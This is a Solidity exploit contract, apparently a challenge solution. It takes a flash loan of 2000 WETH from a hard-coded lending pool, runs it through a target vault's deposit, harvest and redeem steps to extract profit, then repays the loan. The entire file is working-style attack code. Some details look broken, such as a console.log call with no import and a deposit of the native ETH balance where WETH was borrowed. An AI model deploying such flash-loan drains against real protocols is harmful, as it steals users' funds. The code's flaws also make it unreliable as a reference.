// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {IFlashLoanReceiver} from "./interfaces/IFlashLoanReceiver.sol";
import {IPool} from "./interfaces/IPool.sol";
import {IWETH} from "./interfaces/IWETH.sol";

import {TheVault} from "src/quick-earner/TheVault.sol";

contract Attacker is IFlashLoanReceiver {

    address private constant _WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;

    TheVault private immutable _theVault;

    IPool private constant _POOL = IPool(address(0x794a61358D6845594F94dc1DB02A252b5b4814aD));

    constructor(TheVault _vault) {
        _theVault = _vault;
    }

    function executeAttack() external {

        address[] memory _assets = new address[](1);
        _assets[0] = address(_WETH);

        uint256[] memory _amounts = new uint256[](1);
        _amounts[0] = 2000 ether;

        uint256[] memory _modes = new uint256[](_assets.length);

        // 0 = no debt (flash), 1 = stable, 2 = variable
        for (uint256 i = 0; i < _assets.length; i++) _modes[i] = 0;

        _POOL.flashLoan(
            address(this),
            _assets,
            _amounts,
            _modes,
            address(this),
            "",
            0
        );
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address, // initiator
        bytes calldata // params
    ) external override returns (bool) {
        //
        // This contract now has the funds requested.
        //

        // 1. flash loan
        // 2. deposit
        // 3. harvest
        // 4. withdraw
        console.log("WETH balance", IERC20(_WETH).balanceOf(address(this)));

        uint256 _amount = address(this).balance;
        IERC20(_WETH).approve(address(_theVault), _amount);
        _theVault.deposit(_amount, address(this));
        console.log("WETH balance1", IERC20(_WETH).balanceOf(address(this)));

        _theVault.harvest(address(this));
        IWETH(_WETH).deposit{value: address(this).balance}();
        console.log("WETH balance3", IERC20(_WETH).balanceOf(address(this)));

        _theVault.redeem(_theVault.balanceOf(address(this)), address(this), address(this));
        console.log("WETH balance4", IERC20(_WETH).balanceOf(address(this)));

        //
        // ----------------------------------------
        //

        // At the end of the logic above, this contract owes the flashloaned amounts + premiums.
        // Therefore ensure that the contract has enough to repay these amounts.

        // Approve the LendingPool contract allowance to *pull* the owed amount
        for (uint256 i = 0; i < assets.length; i++) {
            IERC20(assets[i]).approve(address(_POOL), (amounts[i] + premiums[i]));
        }

        console.log("WETH balance5", IERC20(_WETH).balanceOf(address(this)));
        require(IERC20(_WETH).balanceOf(address(this)) > 0, "Attacker: Didn't make any profit");

        return true;
    }

    receive() external payable {}
}